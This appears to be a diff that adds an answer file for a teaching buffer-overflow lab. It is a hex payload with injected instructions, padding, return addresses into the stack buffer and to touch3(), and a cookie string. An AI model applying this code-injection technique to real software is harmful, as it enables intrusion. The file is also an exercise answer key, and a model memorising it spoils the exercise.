@@ -1,0 +1,10 @@
+48 c7 c7 05 de 76 55 c3 /* mov location of cookie to rdi and retq */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00  /* end of buf */
+18 2b 68 55 00 00 00 00  /* ret address to buf */
+64 1a 40 00 00 00 00 00  /* ret address to touch3() */
+/* cookie */
+35 35 37 36 64 65 30 35 00 
